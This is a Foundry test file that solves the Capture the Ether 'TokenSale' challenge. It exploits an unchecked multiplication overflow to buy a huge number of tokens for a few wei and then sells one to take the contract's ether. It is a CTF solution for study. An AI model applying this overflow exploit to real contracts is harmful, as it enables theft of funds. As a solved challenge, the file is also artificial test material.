// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {TokenSale} from "../../src/math/TokenSale.sol";

contract TokenSaleTest is Test {
    TokenSale challenge;

    receive() external payable {}

    function setUp() public {
        vm.deal(address(this), 1 ether);
        challenge = new TokenSale{value: 1 ether}();
    }

    function testOverflow() public {
        // cause overflow so we can get cheap tokens and
        //   sell for profit which is loss of the contract
        // learned from https://github.com/minaminao/ctf-blockchain/blob/ebf1539bf0ea5aeb1343435f9f7b39d74b4efdd3/src/CaptureTheEther/TokenSale/Exploit.s.sol#L20-L24
        vm.deal(address(this), 1 ether);
        unchecked {
            // max / ether ... * ether = max
            //   so plus it with one will cause overflow
            uint256 numTokens = (type(uint256).max / 1 ether) + 1;
            // we need to pay this `overflow` amount
            uint256 value = numTokens * 1 ether % type(uint256).max;
            // now we can get almost type(uint256).max tokens
            //   with only a few ether/wei.
            challenge.buy{value: value}(numTokens);
        }
        challenge.sell(1);

        assertTrue(challenge.isComplete(), "not completed");
    }
}
